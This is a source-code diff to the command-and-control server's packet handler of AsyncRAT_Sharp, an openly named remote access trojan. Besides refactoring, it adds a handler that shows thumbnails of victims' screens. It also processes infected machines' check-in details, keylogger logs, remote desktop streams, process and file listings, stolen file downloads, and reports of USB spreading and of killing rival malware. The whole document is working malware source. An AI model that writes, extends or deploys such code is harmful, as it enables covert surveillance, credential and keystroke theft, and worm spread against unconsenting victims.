@@ -12,16 +12,16 @@ namespace AsyncRAT_Sharp.Handle_Packet
 {
     class HandlePacket
     {
-        private static cGeoMain cNewGeoUse = new cGeoMain();
+        private static readonly cGeoMain cNewGeoUse = new cGeoMain();
         public static void Read(object Obj)
         {
             try
             {
                 object[] array = Obj as object[];
-                byte[] Data = (byte[])array[0];
-                Clients Client = (Clients)array[1];
+                byte[] data = (byte[])array[0];
+                Clients client = (Clients)array[1];
                 MsgPack unpack_msgpack = new MsgPack();
-                unpack_msgpack.DecodeFromBytes(Data);
+                unpack_msgpack.DecodeFromBytes(data);
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
                     case "ClientInfo":
@@ -29,25 +29,28 @@ namespace AsyncRAT_Sharp.Handle_Packet
                         {
                             Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                             {
-                                Client.LV = new ListViewItem();
-                                Client.LV.Tag = Client;
-                                Client.LV.Text = string.Format("{0}:{1}", Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], Client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]);
-                                string[] ipinf = cNewGeoUse.GetIpInf(Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
-                                Client.LV.SubItems.Add(ipinf[1]);
-                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
-                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
-                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
-                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
-                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString);
-                                Client.LV.ToolTipText = unpack_msgpack.ForcePathObject("Path").AsString;
-                                Client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
-                                Program.form1.listView1.Items.Insert(0, Client.LV);
-                                lock (Settings.Online)
-                                {
-                                    Settings.Online.Add(Client);
-                                }
+                                client.LV = new ListViewItem();
+                                client.LV.Tag = client;
+                                client.LV.Text = string.Format("{0}:{1}", client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]);
+                                string[] ipinf = cNewGeoUse.GetIpInf(client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
+                                client.LV.SubItems.Add(ipinf[1]);
+                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
+                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
+                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
+                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
+                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString);
+                                client.LV.ToolTipText = unpack_msgpack.ForcePathObject("Path").AsString;
+                                client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
+                                Program.form1.listView1.BeginUpdate();
+                                Program.form1.listView1.Items.Insert(0, client.LV);
+                                Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+                                Program.form1.listView1.EndUpdate();
                             }));
-                            HandleLogs.Addmsg($"Client {Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} connected successfully", Color.Green);
+                            lock (Settings.Online)
+                            {
+                                Settings.Online.Add(client);
+                            }
+                            HandleLogs.Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} connected successfully", Color.Green);
                         }
                         break;
 
@@ -57,9 +60,9 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             {
                                 Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                                 {
-                                    if (Client.LV != null)
+                                    if (client.LV != null)
                                     {
-                                        Client.LV.SubItems[Program.form1.lv_prefor.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString;
+                                        client.LV.SubItems[Program.form1.lv_prefor.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString;
                                     }
                                 }));
                             }
@@ -72,17 +75,51 @@ namespace AsyncRAT_Sharp.Handle_Packet
                         }
                         break;
 
+                    case "thumbnails":
+                        {
+                            if (Program.form1.listView3.InvokeRequired)
+                            {
+                                Program.form1.listView3.BeginInvoke((MethodInvoker)(() =>
+                                {
+                                    if (client.LV2 == null)
+                                    {
+                                        client.LV2 = new ListViewItem();
+                                        client.LV2.Text = string.Format("{0}:{1}", client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]);
+                                        client.LV2.ToolTipText = client.ID;
+                                        using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
+                                        {
+                                            Program.form1.imageList1.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
+                                            client.LV2.ImageKey = client.ID;
+                                            Program.form1.listView3.BeginUpdate();
+                                            Program.form1.listView3.Items.Insert(0,client.LV2);
+                                            Program.form1.listView3.EndUpdate();
+                                        }
+                                    }
+                                    else
+                                    {
+                                        using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
+                                        {
+                                            Program.form1.listView3.BeginUpdate();
+                                            Program.form1.imageList1.Images.RemoveByKey(client.ID);
+                                            Program.form1.imageList1.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
+                                            Program.form1.listView3.EndUpdate();
+                                        }
+                                    }
+                                }));
+                            }
+                        }
+                        break;
 
                     case "BotKiller":
                         {
-                            HandleLogs.Addmsg($"Client {Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} malwares and killed them successfully", Color.Orange);
+                            HandleLogs.Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} malwares and killed them successfully", Color.Orange);
                         }
                         break;
 
 
                     case "usbSpread":
                         {
-                            HandleLogs.Addmsg($"Client {Client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} USB drivers and spreaded them successfully", Color.Purple);
+                            HandleLogs.Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} USB drivers and spreaded them successfully", Color.Purple);
                         }
                         break;
 
@@ -92,7 +129,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             {
                                 Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                                 {
-                                    Client.LV.ForeColor = Color.Empty;
+                                    client.LV.ForeColor = Color.Empty;
                                 }));
                             }
                         }
@@ -104,11 +141,16 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             {
                                 Program.form1.BeginInvoke((MethodInvoker)(() =>
                                 {
-                                    RemoteDesktop RD = (RemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
+                                    FormRemoteDesktop RD = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
                                     try
                                     {
                                         if (RD != null)
                                         {
+                                            if (RD.C2 == null)
+                                            {
+                                                RD.C2 = client;
+                                                RD.timer1.Start();
+                                            }
                                             byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                             Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));
 
@@ -120,18 +162,14 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                             RD.FPS++;
                                             if (RD.sw.ElapsedMilliseconds >= 1000)
                                             {
-                                                RD.Text = "RemoteDesktop:" + Client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
+                                                RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
                                                 RD.FPS = 0;
                                                 RD.sw = Stopwatch.StartNew();
                                             }
                                         }
                                         else
                                         {
-                                            //MsgPack msgpack = new MsgPack();
-                                            //msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-                                            //msgpack.ForcePathObject("Option").AsString = "false";
-                                            //Client.BeginSend(msgpack.Encode2Bytes());
-                                            Client.Disconnected();
+                                            client.Disconnected();
                                             return;
                                         }
                                     }
@@ -147,13 +185,13 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             {
                                 Program.form1.BeginInvoke((MethodInvoker)(() =>
                                 {
-                                    ProcessManager PM = (ProcessManager)Application.OpenForms["processManager:" + Client.ID];
+                                    FormProcessManager PM = (FormProcessManager)Application.OpenForms["processManager:" + client.ID];
                                     if (PM != null)
                                     {
                                         PM.listView1.Items.Clear();
-                                        string AllProcess = unpack_msgpack.ForcePathObject("Message").AsString;
-                                        string data = AllProcess.ToString();
-                                        string[] _NextProc = data.Split(new[] { "-=>" }, StringSplitOptions.None);
+                                        string msgUnpack = unpack_msgpack.ForcePathObject("Message").AsString;
+                                        string processLists = msgUnpack.ToString();
+                                        string[] _NextProc = processLists.Split(new[] { "-=>" }, StringSplitOptions.None);
                                         for (int i = 0; i < _NextProc.Length; i++)
                                         {
                                             if (_NextProc[i].Length > 0)
@@ -190,10 +228,10 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                                 string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                                                 string file = unpack_msgpack.ForcePathObject("File").AsString;
                                                 string size = unpack_msgpack.ForcePathObject("Size").AsString;
-                                                DownloadFile SD = (DownloadFile)Application.OpenForms["socketDownload:" + dwid];
+                                                FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                                                 if (SD != null)
                                                 {
-                                                    SD.C = Client;
+                                                    SD.C = client;
                                                     SD.labelfile.Text = Path.GetFileName(file);
                                                     SD.dSize = Convert.ToInt64(size);
                                                     SD.timer1.Start();
@@ -210,7 +248,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                             Program.form1.BeginInvoke((MethodInvoker)(() =>
                                             {
                                                 string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
-                                                DownloadFile SD = (DownloadFile)Application.OpenForms["socketDownload:" + dwid];
+                                                FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                                                 if (SD != null)
                                                 {
                                                     if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", ""))))
@@ -232,7 +270,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             {
                                 Program.form1.BeginInvoke((MethodInvoker)(() =>
                                 {
-                                    Keylogger KL = (Keylogger)Application.OpenForms["keyLogger:" + Client.ID];
+                                    FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
                                     if (KL != null)
                                     {
                                         KL.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("Log").GetAsString());
@@ -242,7 +280,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                         MsgPack msgpack = new MsgPack();
                                         msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                                         msgpack.ForcePathObject("isON").AsString = "false";
-                                        Client.BeginSend(msgpack.Encode2Bytes());
+                                        client.BeginSend(msgpack.Encode2Bytes());
                                     }
                                 }));
                             }
@@ -259,7 +297,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                         {
                                             Program.form1.BeginInvoke((MethodInvoker)(() =>
                                             {
-                                                FileManager FM = (FileManager)Application.OpenForms["fileManager:" + Client.ID];
+                                                FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                                                 if (FM != null)
                                                 {
                                                     FM.listView1.Items.Clear();
@@ -290,7 +328,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                         {
                                             Program.form1.BeginInvoke((MethodInvoker)(() =>
                                             {
-                                                FileManager FM = (FileManager)Application.OpenForms["fileManager:" + Client.ID];
+                                                FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                                                 if (FM != null)
                                                 {
                                                     FM.listView1.Items.Clear();
@@ -351,8 +389,8 @@ namespace AsyncRAT_Sharp.Handle_Packet
             {
                 Debug.WriteLine(ex.Message);
             }
-            GC.Collect();
-            GC.WaitForPendingFinalizers();
+            //GC.Collect();
+            //GC.WaitForPendingFinalizers();
         }
     }
 }
